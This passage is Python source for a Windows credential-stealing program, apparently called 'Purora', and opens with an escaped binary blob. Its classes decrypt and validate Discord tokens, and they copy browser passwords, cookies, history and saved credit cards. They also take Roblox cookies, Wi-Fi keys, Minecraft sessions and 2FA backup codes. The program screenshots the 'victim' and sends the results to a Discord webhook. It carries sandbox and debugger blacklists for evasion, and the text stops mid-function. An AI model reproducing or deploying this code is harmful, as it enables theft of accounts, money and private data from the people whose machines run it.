ff\xfb_9\xf9\xd9n|\xc6\xea\x7f\xd0\xa8\xffK\x9d\xffO\xa8\x7f\x9b\n\xfdm\x0f#1\xfe+\xd8G-\xea\x7f\x9b\xe2\x9f\x1d\xdf\xaf\xfa\x17\xe3\xfe\xa2\x1b\xaa\xff\xf0\xe4Gx\xe2\x8da\xbd\xfd\xfb\xf4\xf5\xbfV\x7f\x86\xb2\x7f1\xbb\x7fu\xfd\x0fB\xef\xf9\x06\xc4\x9fS\xf4\x1b.\xf8=\xb5?\xdeeL\xff\xd8M\xc7\x7f\xb9~7\xb1\xc4\xff\x84\xfe%\xd8\x9f\xfd\x04\xf6/\xd6\xbf["\x1f\x92\xf0\xef\t\xf2_\xdc\xf5\x96\xf9\x7f\xc9\xe3\xfa\x1fx\xf0\x8f[\xaf\'\x7f\xb2\x16\xffZ\xe4\xffa\xfe2\xd2\xf1\xda\\\x87\xda\xf1d\xc3\x0f\x96L=\x8e\xd0\x7f\xf7\t\xfd\x7f\xa8\x7f,\xc7\xaf\xb2\x8d\xd6\x7f\xd4\xf7\x7fi[\x7f\xf4\x98\xf8/\xd7\x7f7\xaa\xcf\xbf\x7f\x12\xfe\xd7\xd4\xfe\xbd\xf6\xf4\xff\x93\xea5~\xc7\xfcg\xa1\xff\xe9\xe6\xe3\x1f\x9c\x7f\xa8m\xfd[\xa3\xfa\x8f\r\xc6?F\x1b\xa8\xff\xd0\xf9\x1b{\x87\x01\xd3\xff\xf9\xda\xeb\x9f\x0c\xd9\xfe\x93\xdf\xa7\xffA\xd5_\x14\xf5?m\x11\xffm\x98\xff\xec\xeb\xff\\\xf5O\\\xd0\xe7%\x18\xbe\xab\x14=\xc8\xe4I\xb0\xe1\xf8\xef\x9a\xf9\x7fA\xbd\xfd\xdb\n\xff\xc4\xfe\x11\x89\xd5\x9f\xd0<q@\xfbO1\x7f&\xcf\xaf\xa0\xf5\xbak\xe5?\xd7\xe6\xff\x15\xfc\x80\xd3G\xc6^\xe0\xfd\x7f\xeb\xf5\xffk\xd1\xff\xc5\xc7\xff\x1e\x8b\x7f\xf8\xf9\x1av~,\xedo\x9b\xf3\x97\xa2\xbf2\xa9\xef\xc6\xf6o\xb4\xa9\xfe\x07k\xd5\xff\xd2\xfa\x0f\x0f\xfe\xb5\xf5\xff%B\x7f$\xbb~_\xe3\xf3\x8c\xa9\xbf\xdcD\xff\x83\xcd\xe6\xff\t\xfd\xdc\xfc\xf5\xbf<\xfe1\xf9/\xb8\xff\x9f\xc57\x08\xfe\x8d\xd7\xeb\x7f%>\xff\xe3\xc2\xf3<\x11.\xfe\xd6\xbc\xff\xcb\xf7\xc9\x7f~d\xffS\x92\xff\x87\xf9\x95\x98\x7f\xc0\xf5\x7f\x11\xecK\xbe\xff\xc1\x9a\xfe\xbfq\x89\x7fV\xff\xf6[\xdao\x89\xcb\xdf\x88\x1f\x97\xff\xdc\xb4\xfe\x97;\x0f\x9c?\xe4\xd8\x83\xea\xbd\x89\x1c\x0fh\x96\xff\xe2\xef\x7f*\xd435\xf7\xff5\xe5\x7f(\x9f\xa1\xec\xdf\xce\xed\xdf}M\xfd\xc7&\xf3\xff\x98\xf8 \xe9\xff\xcc\xf4/\xbe\xfc\xd4(\x7f\xfcI\xea\xdf\xa6\xef\xc6e?n\xb7\xdf\x1c\xcd\xcf\xf9\xe3\xf4\x7fi\x1e\xff%\xf1\x00\xcf\xf3\x8f\\\xff\xa9\xed\xcff\xf6o\xcd\xfe\x07\xf5\xfd\x87\xbc\xf9/\xb4\xbe\xcc\xc2\xbfM\xc4?\x1c\xfbW\x88\x97-\xdc\xfe\xe3\xc8\xfe\x8d\xea\xe2\x1f\x7f\xcc\xfa\xdf\xa6\xfd\x0f\xd6\xe9\xffl\xf5\xbf\x0f\x1b\xe6w\x8a\xfe?+\xffe&\xf1gO\xbf\xd7Z\xfb\xa3\r\xfe\xd9\xf1\x05\x14\xffu\x9e\x0f\x86\xea\xf7\xbbc\xe1\xf9yV>\xebZ\xfd\xff\x9e\x16\xff~\'\xff\xdf#\xfb_=\xa6\xff\x0b\xce\xcfi\xda?\xa7u\xfc\xc3\x8b\x7f\xb4\x1e\xcc\x8eoy\x9eO\x12=\x85\xff\x8f\xa9\x9fy3\\\xaf\xfem\x13\xf5\xbf`\xff\x06\xbb\x0f\xa3\xf2\xf9\x0bq\x99\xcf\x00\xc1\xfb7W\xe6\xa9\xc4\x8f\xce\x7ff\x9e_a\xdbo\xa0k\xdd\xfa\xd5!\xcdO\x8c[\xda\xbf\xe2\xf3\xa3\xd0\xf3\x1b\x1d\x7fvC\xfbw\x13\xf9\xcfM\xfb\xff\t\xf1i\x1b\xff\xa4|\xe5\xc6\xf6o\x8b\xe7\x7fdb\xfcc\x03\xfd\x0f\xca\xf8*\xf4\xd3\xf2<\xff\x83\xed\x9f\x8d\xf0/\xf2>?\xeaI\xec\xdf\x06\xf5o\x9b\x89\x7f\xf8\xfc\x7f\r\xf9\x9f\xd0\xdf{\xb3\xfc\x0f?\xcf\x81\xcb?\xbd\xde@\xff+R\xffV\xd3?\xcc\xb6\x8f\xf0\xf3\x07\x13\xf9\xf9\xbf\x8f\xef\xff\xc7\xf7?\x15\x9f\xf7I\xecs\xf1ymk\xc6\x7fq\xfe\x1fW\xff\x16\xd5\xd7\x7f4\xcd\x7f\x9e\xd6\xf4\xbfr\xe3\xbf\x83\xd2\xff\xe7\xe9\xbf\xc6\xfaOY\x7fvM\xfes\xd2\xba\xfe7r\xf2\xb9Z\xe6\xbfX\xcf\x83\x0c\xa8\xfcY\xf2,\xf7\x7f\xf6\xd4\xe7\x99\xf9\xb5\xc5?\xce\x1f\x86\xfb)X\xfe\xb5\x94\xf6\x17\xe0\xfb#5\xa9\x0fE\xf2\xdc\x95\xfb\x8f{\xeb\x7f3\xa6\x1f\xed\xa2\xac\xdfg\xe7\'?\xefX\xc8\xdf\xd8v\xd6\x8b\xe4\xaf\xd8?\xa1>\xbe\xeey6\xe2\xf34\x91>\xd2\xf1\n\xc3\xc7\x8b\xe7\xf7h\xcd\x84\x9f\x0fqU\xe8\xcb\xb7\xdaE\r=y\xbf\xdd\xc2x7F\x9e\xcf\xdf%\xc6O\xa8\xaf\xc6\xd7\xa3\xa1~\x9e\x97\xe1*Z\xe7M\xbe=\x87u@\x08\xa7\x1bA\xd2\xf2m/\xbcy\xb9\xdd\x0ba\xf9\xddW\xcaP\xec\xee}\xed\xff\xf2\xf7\xe0\x87\xed\xed\xed\xff\x03\xdf\xd8H\x0c'))))

@try_extract
class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(__HOOK__)
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())

        for token in self.tokens:
            if token in self.tokens_sent:
                pass

            val_codes = []
            val = ""
            nitro = "none"

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                       'Content-Type': 'application/json',
                       'Authorization': token}

            r = requests.get(self.baseurl, headers=headers).json()
            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)

            username = r['username'] + '#' + r['discriminator']
            discord_id = r['id']
            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
            phone = r['phone']
            email = r['email']

            try:
                if r['mfa_enabled']:
                    mfa = "true"
                else:
                    mfa = "none"
            except Exception:
                mfa = "none"

            try:
                if r['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif r['premium_type'] == 2:
                    nitro = 'Nitro'
                elif r['premium_type'] == 3:
                    nitro = 'Nitro Basic'
            except BaseException:
                nitro = nitro

            if b == []:
                methods = "none"
            else:
                methods = ""
                try:
                    for method in b:
                        if method['type'] == 1:
                            methods += "CREDIT CARD"
                        elif method['type'] == 2:
                            methods += "PAYPAL ACCOUNT"
                        else:
                            methods += "FOUND UNKNOWN METHOND"
                except TypeError:
                    methods += "FOUND UNKNOWN METHOND"

            val += f' **Discord ID:** `{discord_id}` \n **Email:** `{email}`\n **Phone:** `{phone}`\n\n **2FA:** `{mfa}`\n **Nitro:** `{nitro}`\n **Billing:** `{methods}`\n\n **Token:** `{token}`\n'

            if "code" in g.text:
                codes = json.loads(g.text)
                try:
                    for code in codes:
                        val_codes.append((code['code'], code['promotion']['outbound_title']))
                except TypeError:
                    pass

            if val_codes == []:
                val += f'\n**No Gift Cards Found**\n'
            elif len(val_codes) >= 3:
                num = 0
                for c, t in val_codes:
                    num += 1
                    if num == 3:
                        break
                    val += f'\n `{t}:`\n**{c}**\n[Click to copy!]({c})\n'
            else:
                for c, t in val_codes:
                    val += f'\n `{t}:`\n**{c}**\n[Click to copy!]({c})\n'

            embed = Embed(title=username, color=10038562)
            embed.add_field(name=".                                                    Discord Info                                .", value=val + "\u200b", inline=False)
            embed.set_thumbnail(url=avatar)

            webhook.send(
                embed=embed,
                avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096",
                username="Purora")
            self.tokens_sent += token

        image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
        )
        image.save(tempfolder + "\\image.png")

        embed2 = Embed(title="Victim point of view", color=10038562)
        file = File(tempfolder + "\\image.png", filename="image.png")
        embed2.set_image(url="attachment://image.png")

        webhook.send(
            embed=embed2,
            file=file,
            username="Purora")
        os.close(image)


@try_extract
class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        os.makedirs(os.path.join(tempfolder, "Browser"), exist_ok=True)
        os.makedirs(os.path.join(tempfolder, "Roblox"), exist_ok=True)

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass

        self.roblox_cookies()

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return

        loginvault = create_temp()
        copy2(path, loginvault)
        conn = sqlite3.connect(loginvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url != "":
                    f.write(f"URL: {url}  Username: {username}  Password: {password}\n")
        cursor.close()
        conn.close()
        os.remove(loginvault)

    def cookies(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        historyvault = create_temp()
        copy2(path, historyvault)
        conn = sqlite3.connect(historyvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser History.txt"), 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
        cursor.close()
        conn.close()
        os.remove(historyvault)

    def credit_cards(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        cardvault = create_temp()
        copy2(path, cardvault)
        conn = sqlite3.connect(cardvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Creditcards.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                if name_on_card and card_number_encrypted != "":
                    f.write(
                        f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.decrypt_password(card_number_encrypted, self.masterkey)}\n")
        f.close()
        cursor.close()
        conn.close()
        os.remove(cardvault)

    def roblox_cookies(self):
        with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github}\n\n")
            with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
                for line in f2:
                    if ".ROBLOSECURITY" in line:
                        f.write(line.split(".ROBLOSECURITY")[1].strip() + "\n")
            f2.close()
        f.close()


@try_extract
class Wifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        os.makedirs(os.path.join(tempfolder, "Wifi"), exist_ok=True)

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github} | Wifi Networks & Passwords\n\n")

        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
            else:
                with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
                    f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                f.close()

        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh wlan show profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')
        f.close()


@try_extract
class Minecraft:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
        self.usercache_path = "\\.minecraft\\usercache.json"
        self.error_message = "No minecraft accounts or access tokens :("

        os.makedirs(os.path.join(tempfolder, "Minecraft"), exist_ok=True)
        self.session_info()
        self.user_cache()

    def session_info(self):
        with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github} | Minecraft Session Info\n\n")
            if os.path.exists(self.roaming + self.accounts_path):
                with open(self.roaming + self.accounts_path, "r") as g:
                    self.session = json.load(g)
                    f.write(json.dumps(self.session, indent=4))
            else:
                f.write(self.error_message)
        f.close()

    def user_cache(self):
        with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github}\n\n")
            if os.path.exists(self.roaming + self.usercache_path):
                with open(self.roaming + self.usercache_path, "r") as g:
                    self.user = json.load(g)
                    f.write(json.dumps(self.user, indent=4))
            else:
                f.write(self.error_message)
        f.close()


@try_extract
class BackupCodes:
    def __init__(self):
        self.path = os.environ["HOMEPATH"]
        self.code_path = '\\Downloads\\discord_backup_codes.txt'

        os.makedirs(os.path.join(tempfolder, "Discord"), exist_ok=True)
        self.get_codes()

    def get_codes(self):
        with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
            f.write(f"{github}\n\n")
            if os.path.exists(self.path + self.code_path):
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            else:
                f.write("No discord backup codes found")
        f.close()


def zipup():
    global localappdata
    localappdata = os.getenv('LOCALAPPDATA')

    _zipfile = os.path.join(localappdata, f'{os.getlogin()}.zip')
    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
    abs_src = os.path.abspath(tempfolder)
    for dirname, _, files in os.walk(tempfolder):
        for filename in files:
            absname = os.path.abspath(os.path.join(dirname, filename))
            arcname = absname[len(abs_src) + 1:]
            zipped_file.write(absname, arcname)
    zipped_file.close()

    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update,
                                             '--processStart',
                                             executable],
                                            shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
class Debug:
    global tempfolder
    tempfolder = mkdtemp()

    def __init__(self):

        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        self.blackListedUsers = [
            'WDAccount', 'Abby', 'hmarc', 'patex', 'RDh', 'kEecfMwgj', 'Frank', '5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8M', 'wA',
            'U1', 'test', 'Reg']
        self.blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
            '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
            '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = [
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
            "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "qemu-ga",
            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeer", argv[0]]

        self.check_process()
        if self.get_network():
